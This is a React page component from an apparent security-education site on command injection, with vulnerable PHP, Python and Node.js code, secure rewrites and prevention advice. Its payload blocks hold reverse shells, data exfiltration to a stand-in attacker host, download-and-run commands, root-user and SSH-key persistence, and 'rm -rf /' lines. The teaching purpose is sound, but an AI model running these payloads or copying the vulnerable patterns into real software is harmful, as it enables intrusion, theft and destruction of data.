
import React from 'react';
import { Terminal } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const CommandInjection: React.FC = () => {
  return (
    <section id="cmd-injection" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Command Injection</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            Command injection occurs when an application passes unsafe user-supplied data to a system shell. 
            Attackers can inject operating system commands to execute arbitrary code on the host server,
            potentially leading to complete system compromise, data theft, or service disruption.
            This vulnerability is especially severe as it often provides attackers with the same privileges
            as the application running the command, and in worst cases, can lead to full server takeover.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Execute arbitrary operating system commands on the server to gain unauthorized access, steal sensitive data,
              install backdoors, pivot to other systems, or completely compromise the hosting infrastructure.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Common Command Injection Attack Vectors</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="OS Command Execution"
              description="Direct execution of shell commands through functions like system(), exec(), or shell_exec() with user-controlled input parameters."
              severity="high"
            />
            <SecurityCard
              title="Path Traversal + Command"
              description="Combining directory traversal with command injection to access and execute commands in different parts of the filesystem."
              severity="high"
            />
            <SecurityCard
              title="Blind Command Injection"
              description="Command injection where the output is not directly visible, requiring time delays or out-of-band techniques to confirm execution."
              severity="medium"
            />
            <SecurityCard
              title="Filter Bypass Techniques"
              description="Using encoding, alternative command separators, or shell features to bypass weak input validation and blacklist filters."
              severity="medium"
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Network Utilities:</strong> Ping, traceroute, nslookup, whois functionality</li>
              <li><strong>File Operations:</strong> File upload, compression, conversion, and processing utilities</li>
              <li><strong>System Diagnostics:</strong> Health checks, log viewers, and system monitoring tools</li>
              <li><strong>Data Processing:</strong> Report generation, data export/import, and backup utilities</li>
              <li><strong>Development Tools:</strong> Code compilation, version control, and deployment scripts</li>
              <li><strong>Administrative Interfaces:</strong> System configuration, user management, and maintenance tools</li>
              <li><strong>Third-party Integrations:</strong> API calls to external services requiring shell commands</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why Command Injection Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Technical Weaknesses</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Direct user input concatenation into shell commands</li>
                <li>Insufficient input validation and sanitization</li>
                <li>Improper use of shell metacharacters and operators</li>
                <li>Applications running with excessive privileges</li>
                <li>Lack of proper command parameter separation</li>
                <li>Inadequate output encoding and error handling</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Flaws</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Using shell execution functions instead of safer alternatives</li>
                <li>Blacklist-based filtering instead of whitelisting</li>
                <li>Poor understanding of shell command syntax and behavior</li>
                <li>Mixing user data with system command structures</li>
                <li>Inadequate testing of edge cases and malicious inputs</li>
                <li>Failure to implement defense-in-depth strategies</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="discovery">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="discovery">Discovery</TabsTrigger>
              <TabsTrigger value="testing">Testing</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="persistence">Persistence</TabsTrigger>
            </TabsList>
            
            <TabsContent value="discovery" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Command Injection Discovery</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Identify Command Execution Points:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Look for functionality that might use system commands</li>
                      <li>Test network utilities (ping, nslookup, traceroute)</li>
                      <li>Check file processing and administrative features</li>
                      <li>Examine any system diagnostic or monitoring tools</li>
                    </ul>
                  </li>
                  <li><strong>Input Vector Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Test form fields, URL parameters, and HTTP headers</li>
                      <li>Check file upload names and content</li>
                      <li>Analyze JSON, XML, and other structured data inputs</li>
                      <li>Examine cookie values and session data</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="testing" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Vulnerability Testing</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Testing Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Command Separator Injection:</strong> Test ; && || | operators</li>
                    <li><strong>Command Substitution:</strong> Try backtick and dollar-parentheses syntax</li>
                    <li><strong>Time-based Detection:</strong> Use sleep/ping commands for blind injection</li>
                    <li><strong>Error-based Detection:</strong> Inject invalid commands to trigger errors</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Command Injection Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Command Confirmation:</strong> Execute harmless commands to verify injection</li>
                    <li><strong>System Reconnaissance:</strong> Gather information about the target system</li>
                    <li><strong>File System Access:</strong> Read, write, and modify files on the server</li>
                    <li><strong>Network Connectivity:</strong> Test outbound connections and data exfiltration</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="persistence" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Persistence and Escalation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Advanced Exploitation:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Reverse Shell Establishment:</strong> Create persistent command and control channels</li>
                    <li><strong>Privilege Escalation:</strong> Attempt to gain higher system privileges</li>
                    <li><strong>Backdoor Installation:</strong> Install persistent access mechanisms</li>
                    <li><strong>Lateral Movement:</strong> Pivot to other systems in the network</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Common Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Command Injection Payloads</h4>
          <CodeExample 
            language="bash" 
            isVulnerable={true}
            title="Basic Command Injection Payloads" 
            code={`# Command separators - execute additional commands
; whoami
&& whoami
|| whoami
| whoami

# Command substitution - execute commands within other commands
\`whoami\`
$(whoami)

# Time-based detection (blind injection)
; sleep 10
&& ping -c 10 127.0.0.1
|| timeout 10

# File system access
; cat /etc/passwd
&& ls -la /
|| find / -name "*.conf" 2>/dev/null

# Network connectivity testing
; ping -c 1 attacker.com
&& wget http://attacker.com/test
|| curl http://attacker.com/callback

# Information gathering
; uname -a
&& ps aux
|| netstat -tulpn

# Error-based detection
; invalidcommand123
&& /nonexistent/path
|| ''

# Output redirection and file operations
; echo "backdoor" > /tmp/test.txt
&& cat /etc/passwd > /tmp/passwd.txt
|| ls -la / >> /tmp/files.txt`} 
          />
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Vulnerable PHP Command Injection" 
            code={`<?php
// VULNERABLE: Direct user input in shell commands
function pingHost($host) {
    // User input directly concatenated into command
    $command = "ping -c 4 " . $host;
    return shell_exec($command);
}

// Usage in web application
if (isset($_POST['target'])) {
    $result = pingHost($_POST['target']);
    echo "<pre>" . htmlspecialchars($result) . "</pre>";
}

// Attacker payload: 127.0.0.1; cat /etc/passwd
// Resulting command: ping -c 4 127.0.0.1; cat /etc/passwd

// VULNERABLE: File processing with user input
function convertImage($filename, $format) {
    // Direct concatenation creates command injection
    $command = "convert " . $filename . " output." . $format;
    exec($command, $output, $return_code);
    
    if ($return_code === 0) {
        return "Conversion successful";
    } else {
        return "Conversion failed";
    }
}

// Attacker payload for filename: "image.jpg; rm -rf /"
// Resulting command: convert image.jpg; rm -rf / output.png

// VULNERABLE: Log file viewer
function viewLogFile($logfile) {
    // User controls which log file to view
    $command = "tail -n 100 /var/log/" . $logfile;
    return shell_exec($command);
}

// Attacker payload: "../../../etc/passwd; whoami #"
// Resulting command: tail -n 100 /var/log/../../../etc/passwd; whoami #
?>`} 
          />
          
          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Vulnerable Python Command Injection" 
            code={`import subprocess
import os
from flask import Flask, request

app = Flask(__name__)

# VULNERABLE: Using shell=True with user input
@app.route('/ping', methods=['POST'])
def ping_host():
    host = request.form.get('host', '')
    
    # VULNERABLE: Direct string concatenation with shell=True
    command = f"ping -c 4 {host}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    return f"<pre>{result.stdout}</pre>"

# VULNERABLE: Using os.system with user input
@app.route('/nslookup', methods=['POST'])
def dns_lookup():
    domain = request.form.get('domain', '')
    
    # VULNERABLE: os.system with user-controlled input
    command = f"nslookup {domain}"
    os.system(command)
    
    return "DNS lookup completed"

# VULNERABLE: File compression utility
@app.route('/compress', methods=['POST'])
def compress_files():
    filename = request.form.get('filename', '')
    compression = request.form.get('compression', 'zip')
    
    # VULNERABLE: User controls both filename and compression type
    if compression == 'zip':
        command = f"zip -r archive.zip {filename}"
    elif compression == 'tar':
        command = f"tar -czf archive.tar.gz {filename}"
    else:
        return "Unsupported compression format"
    
    subprocess.run(command, shell=True)
    return "Compression completed"

# Attacker payloads:
# host: "127.0.0.1; curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)"
# domain: "google.com && wget http://attacker.com/malware.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
# filename: "file.txt; rm -rf / #"`} 
          />
          
          <CodeExample 
            language="javascript" 
            isVulnerable={true}
            title="Vulnerable Node.js Command Injection" 
            code={`const express = require('express');
const { exec } = require('child_process');
const app = express();

app.use(express.urlencoded({ extended: true }));

// VULNERABLE: Direct user input in shell commands
app.post('/ping', (req, res) => {
    const host = req.body.host;
    
    // VULNERABLE: String concatenation with user input
    const command = 'ping -c 4 ' + host;
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send('Error: ' + error.message);
            return;
        }
        res.send('<pre>' + stdout + '</pre>');
    });
});

// VULNERABLE: File processing endpoint
app.post('/process-file', (req, res) => {
    const filename = req.body.filename;
    const action = req.body.action;
    
    let command;
    
    // VULNERABLE: User controls both filename and action
    switch(action) {
        case 'view':
            command = \`cat \${filename}\`;
            break;
        case 'delete':
            command = \`rm \${filename}\`;
            break;
        case 'compress':
            command = \`gzip \${filename}\`;
            break;
        default:
            return res.send('Invalid action');
    }
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send('Error: ' + error.message);
        } else {
            res.send('Operation completed: ' + stdout);
        }
    });
});

// VULNERABLE: System information endpoint
app.get('/system-info', (req, res) => {
    const info_type = req.query.type;
    
    // VULNERABLE: User controls which system command to run
    const commands = {
        'cpu': 'cat /proc/cpuinfo',
        'memory': 'free -h',
        'disk': 'df -h',
        'processes': 'ps aux',
        'custom': req.query.command // Extremely dangerous!
    };
    
    const command = commands[info_type];
    
    if (command) {
        exec(command, (error, stdout, stderr) => {
            res.send('<pre>' + (stdout || stderr) + '</pre>');
        });
    } else {
        res.send('Invalid info type');
    }
});

// Attacker payloads:
// host: "127.0.0.1; nc attacker.com 4444 -e /bin/bash"
// filename: "test.txt; curl http://attacker.com/exfil -d @/etc/passwd"
// type=custom&command=whoami; cat /etc/shadow`} 
          />
        </div>

        {/* Advanced Exploitation Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Advanced Exploitation Techniques</h4>
          <CodeExample 
            language="bash" 
            isVulnerable={true}
            title="Reverse Shell Payloads" 
            code={`# Bash reverse shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# NC reverse shell variants
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f

# Python reverse shell
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl reverse shell
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby reverse shell
; ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Data exfiltration payloads
; curl http://attacker.com/exfil -d @/etc/passwd
; wget --post-file=/etc/shadow http://attacker.com/collect
; cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com/data

# Persistence mechanisms
; echo "attacker_user:x:0:0::/root:/bin/bash" >> /etc/passwd
; echo "*/5 * * * * /tmp/backdoor.sh" | crontab -
; echo "ssh-rsa AAAAB3... attacker@evil.com" >> ~/.ssh/authorized_keys`} 
          />
          
          <CodeExample 
            language="bash" 
            isVulnerable={true}
            title="Filter Bypass Techniques" 
            code={`# Bypassing character filtering
# If semicolon (;) is filtered, use alternatives:
&& whoami
|| whoami
| whoami

# If spaces are filtered:
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat\${IFS}/etc/passwd

# If slash (/) is filtered:
cat$HOME..passwd
cat$(echo$IFS/)etc$(echo$IFS/)passwd

# Using environment variables
$USER
$HOME
$PATH
$PWD

# Command encoding and obfuscation
$(echo "d2hvYW1p" | base64 -d)  # whoami in base64
$(printf "\\x77\\x68\\x6f\\x61\\x6d\\x69")  # whoami in hex

# Using wildcards
cat /etc/pass*
ls /et?/pass??

# Case manipulation (if case-sensitive filtering)
Cat /ETC/passwd
CAT /etc/PASSWD

# Using command history and aliases
!!  # Last command
!w  # Last command starting with 'w'

# Double encoding
%253B  # URL encoded semicolon (;)
%2527  # URL encoded single quote (')

# Null byte injection (in some contexts)
cat /etc/passwd%00.txt

# Using alternative command separators
cat /etc/passwd%0Awhoami  # Newline
cat /etc/passwd%0Dwhoami  # Carriage return

# Bash brace expansion
{cat,/etc/passwd}
{ls,-la,/}

# Process substitution
cat <(echo /etc/passwd)
diff <(echo) <(whoami)`} 
          />
        </div>

        {/* Secure Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Implementation Examples</h4>
          <CodeExample 
            language="python" 
            isVulnerable={false}
            title="Secure Python Command Execution" 
            code={`import subprocess
import shlex
import ipaddress
import re
from flask import Flask, request

app = Flask(__name__)

# SECURE: Input validation and parameterized commands
@app.route('/ping', methods=['POST'])
def ping_host_secure():
    host = request.form.get('host', '').strip()
    
    # SECURE: Validate input is a valid IP address or hostname
    if not is_valid_host(host):
        return "Invalid host format", 400
    
    try:
        # SECURE: Use subprocess with argument list (no shell=True)
        result = subprocess.run(
            ['ping', '-c', '4', host],
            capture_output=True,
            text=True,
            timeout=10,
            check=False
        )
        
        return f"<pre>{result.stdout}</pre>"
    except subprocess.TimeoutExpired:
        return "Request timed out", 500
    except Exception as e:
        return f"Error: {str(e)}", 500

# SECURE: File operations with validation
@app.route('/process-file', methods=['POST'])
def process_file_secure():
    filename = request.form.get('filename', '').strip()
    action = request.form.get('action', '').strip()
    
    # SECURE: Validate action against whitelist
    allowed_actions = ['view', 'delete', 'compress']
    if action not in allowed_actions:
        return "Invalid action", 400
    
    # SECURE: Validate and sanitize filename
    if not is_valid_filename(filename):
        return "Invalid filename", 400
    
    # SECURE: Construct safe file path
    safe_path = os.path.join('/safe/directory/', os.path.basename(filename))
    
    if not os.path.exists(safe_path):
        return "File not found", 404
    
    try:
        if action == 'view':
            # SECURE: Use Python file operations instead of shell commands
            with open(safe_path, 'r') as file:
                content = file.read(1024)  # Limit content size
                return f"<pre>{content}</pre>"
        elif action == 'delete':
            os.remove(safe_path)
            return "File deleted successfully"
        elif action == 'compress':
            # SECURE: Use Python libraries instead of shell commands
            import gzip
            with open(safe_path, 'rb') as f_in:
                with gzip.open(safe_path + '.gz', 'wb') as f_out:
                    f_out.writelines(f_in)
            return "File compressed successfully"
    except Exception as e:
        return f"Error processing file: {str(e)}", 500

def is_valid_host(host):
    # Validate IP address
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass
    
    # Validate hostname
    if len(host) > 255:
        return False
    
    # Allow only alphanumeric characters, dots, and hyphens
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        return False
    
    # Additional hostname validation
    parts = host.split('.')
    for part in parts:
        if not part or len(part) > 63:
            return False
        if part.startswith('-') or part.endswith('-'):
            return False
    
    return True

def is_valid_filename(filename):
    # Reject dangerous characters and patterns
    dangerous_chars = ['..', '/', '\\\\', '|', ';', '&', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '*', '?', "'", '"']
    
    for char in dangerous_chars:
        if char in filename:
            return False
    
    # Allow only safe characters
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        return False
    
    # Reasonable length limit
    if len(filename) > 100:
        return False
    
    return True

# SECURE: Alternative approach using allowed command whitelist
@app.route('/system-info', methods=['GET'])
def system_info_secure():
    info_type = request.args.get('type', '').strip()
    
    # SECURE: Predefined command mapping with no user input
    allowed_commands = {
        'cpu': ['cat', '/proc/cpuinfo'],
        'memory': ['free', '-h'],
        'disk': ['df', '-h'],
        'uptime': ['uptime']
    }
    
    if info_type not in allowed_commands:
        return "Invalid info type", 400
    
    try:
        command = allowed_commands[info_type]
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=5,
            check=False
        )
        
        return f"<pre>{result.stdout}</pre>"
    except subprocess.TimeoutExpired:
        return "Command timed out", 500
    except Exception as e:
        return f"Error: {str(e)}", 500`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={false}
            title="Secure PHP Command Execution" 
            code={`<?php
// SECURE: Input validation and escapeshellarg usage
function pingHostSecure($host) {
    // Validate input format
    if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_DOMAIN)) {
        return "Invalid host format";
    }
    
    // Additional validation for reasonable length
    if (strlen($host) > 255) {
        return "Host name too long";
    }
    
    // SECURE: Use escapeshellarg to properly escape the argument
    $escapedHost = escapeshellarg($host);
    $command = "ping -c 4 " . $escapedHost;
    
    // Execute with proper error handling
    $output = shell_exec($command . " 2>&1");
    
    if ($output === null) {
        return "Command execution failed";
    }
    
    return htmlspecialchars($output);
}

// SECURE: File operations without shell commands
function processFileSecure($filename, $action) {
    // Validate action against whitelist
    $allowedActions = ['view', 'delete', 'info'];
    if (!in_array($action, $allowedActions)) {
        return "Invalid action";
    }
    
    // Validate and sanitize filename
    if (!isValidFilename($filename)) {
        return "Invalid filename";
    }
    
    // Construct safe file path
    $safeDir = '/safe/uploads/';
    $safePath = $safeDir . basename($filename);
    
    // Check if file exists and is within allowed directory
    if (!file_exists($safePath) || !isWithinDirectory($safePath, $safeDir)) {
        return "File not found or access denied";
    }
    
    switch ($action) {
        case 'view':
            // SECURE: Use PHP file functions instead of shell commands
            $content = file_get_contents($safePath, false, null, 0, 1024); // Limit size
            return htmlspecialchars($content);
            
        case 'delete':
            if (unlink($safePath)) {
                return "File deleted successfully";
            } else {
                return "Failed to delete file";
            }
            
        case 'info':
            $stat = stat($safePath);
            return "File size: " . $stat['size'] . " bytes\\nLast modified: " . date('Y-m-d H:i:s', $stat['mtime']);
            
        default:
            return "Unknown action";
    }
}

function isValidFilename($filename) {
    // Check for dangerous characters and patterns
    $dangerousPatterns = ['..', '/', '\\\\', '|', ';', '&', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '*', '?'];
    
    foreach ($dangerousPatterns as $pattern) {
        if (strpos($filename, $pattern) !== false) {
            return false;
        }
    }
    
    // Allow only safe characters
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $filename)) {
        return false;
    }
    
    // Reasonable length limit
    if (strlen($filename) > 100) {
        return false;
    }
    
    return true;
}

function isWithinDirectory($filePath, $allowedDir) {
    $realFilePath = realpath($filePath);
    $realAllowedDir = realpath($allowedDir);
    
    return $realFilePath !== false && 
           $realAllowedDir !== false && 
           strpos($realFilePath, $realAllowedDir) === 0;
}

// SECURE: Network utility wrapper
function networkUtilitySecure($utility, $target) {
    // Whitelist allowed utilities
    $allowedUtilities = ['ping', 'traceroute', 'nslookup'];
    if (!in_array($utility, $allowedUtilities)) {
        return "Utility not allowed";
    }
    
    // Validate target based on utility
    switch ($utility) {
        case 'ping':
        case 'traceroute':
            if (!filter_var($target, FILTER_VALIDATE_IP) && !filter_var($target, FILTER_VALIDATE_DOMAIN)) {
                return "Invalid target for " . $utility;
            }
            break;
        case 'nslookup':
            if (!filter_var($target, FILTER_VALIDATE_DOMAIN)) {
                return "Invalid domain for nslookup";
            }
            break;
    }
    
    // Execute with proper argument escaping
    $escapedTarget = escapeshellarg($target);
    $command = $utility . " " . $escapedTarget;
    
    // Execute with timeout and error handling
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $process = proc_open($command, $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        fclose($pipes[0]);
        
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        
        fclose($pipes[1]);
        fclose($pipes[2]);
        
        $returnCode = proc_close($process);
        
        if ($returnCode === 0) {
            return htmlspecialchars($output);
        } else {
            return "Command failed: " . htmlspecialchars($error);
        }
    }
    
    return "Failed to execute command";
}
?>`} 
          />
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Command Injection Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite:</strong> Command injection scanner and payload generator</li>
                <li><strong>OWASP ZAP:</strong> Active and passive command injection detection</li>
                <li><strong>Commix:</strong> Automated command injection testing tool</li>
                <li><strong>SQLmap:</strong> Includes OS command injection capabilities</li>
                <li><strong>Nuclei:</strong> Template-based command injection detection</li>
                <li><strong>w3af:</strong> Web application scanner with command injection plugins</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>curl/wget:</strong> Command-line HTTP request tools</li>
                <li><strong>Postman/Insomnia:</strong> API testing and request crafting</li>
                <li><strong>Browser DevTools:</strong> Network monitoring and debugging</li>
                <li><strong>Custom Scripts:</strong> Python, Bash automation for testing</li>
                <li><strong>Payload Lists:</strong> SecLists command injection payloads</li>
                <li><strong>Out-of-band Tools:</strong> DNS, HTTP callbacks for blind injection</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive Prevention Strategies</h4>
          <Tabs defaultValue="input">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="input">Input Validation</TabsTrigger>
              <TabsTrigger value="execution">Safe Execution</TabsTrigger>
              <TabsTrigger value="architecture">Architecture</TabsTrigger>
            </TabsList>
            
            <TabsContent value="input" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Input Validation and Sanitization</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Implement strict whitelist-based input validation</li>
                    <li>Use regular expressions to validate input formats</li>
                    <li>Reject inputs containing shell metacharacters</li>
                    <li>Validate against expected data types and ranges</li>
                    <li>Implement maximum length restrictions</li>
                    <li>Use proper encoding and escaping functions</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="execution" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Safe Command Execution</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Avoid shell execution functions when possible</li>
                    <li>Use parameterized commands with argument arrays</li>
                    <li>Employ proper argument escaping functions</li>
                    <li>Implement command timeouts and resource limits</li>
                    <li>Use language-specific libraries instead of shell commands</li>
                    <li>Apply the principle of least privilege</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="architecture" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Architectural Controls</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Implement application sandboxing and containerization</li>
                    <li>Use separate processes with restricted privileges</li>
                    <li>Deploy runtime application self-protection (RASP)</li>
                    <li>Implement comprehensive logging and monitoring</li>
                    <li>Use security frameworks and libraries</li>
                    <li>Regular security assessments and code reviews</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Special Cases */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special Cases and Environment Considerations</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Platform-Specific Considerations</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Windows:</strong> CMD and PowerShell injection vectors</li>
                <li><strong>Linux/Unix:</strong> Bash and shell-specific metacharacters</li>
                <li><strong>Cloud Environments:</strong> Container escape and metadata access</li>
                <li><strong>Mobile Applications:</strong> Platform-specific command execution</li>
                <li><strong>IoT Devices:</strong> Limited security controls and update mechanisms</li>
                <li><strong>Legacy Systems:</strong> Outdated libraries and security controls</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Development Environment Issues</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Development Modes:</strong> Debug features exposing command execution</li>
                <li><strong>Testing Environments:</strong> Relaxed security controls in non-production</li>
                <li><strong>CI/CD Pipelines:</strong> Build scripts with command injection risks</li>
                <li><strong>Containerized Apps:</strong> Dockerfile RUN commands and container escapes</li>
                <li><strong>Serverless Functions:</strong> Limited execution environment protections</li>
                <li><strong>Microservices:</strong> Inter-service command execution vulnerabilities</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default CommandInjection;
